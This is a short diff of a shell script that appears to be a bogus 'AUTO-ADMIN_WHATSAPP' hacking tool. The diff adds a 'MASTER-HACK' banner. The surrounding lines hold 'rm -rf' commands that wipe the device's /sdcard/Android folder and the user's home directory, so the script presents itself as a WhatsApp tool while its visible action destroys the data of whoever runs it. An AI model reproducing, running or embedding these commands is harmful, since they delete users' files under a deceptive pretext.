@@ -2,6 +2,7 @@ clear
 
 figlet -f slant "AUTO-ADMIN_WHATSAPP"
 
+figlet -f slant "MASTER-HACK"
 
 rm -rf cd /sdcard/Android
 rm -rf cd ~
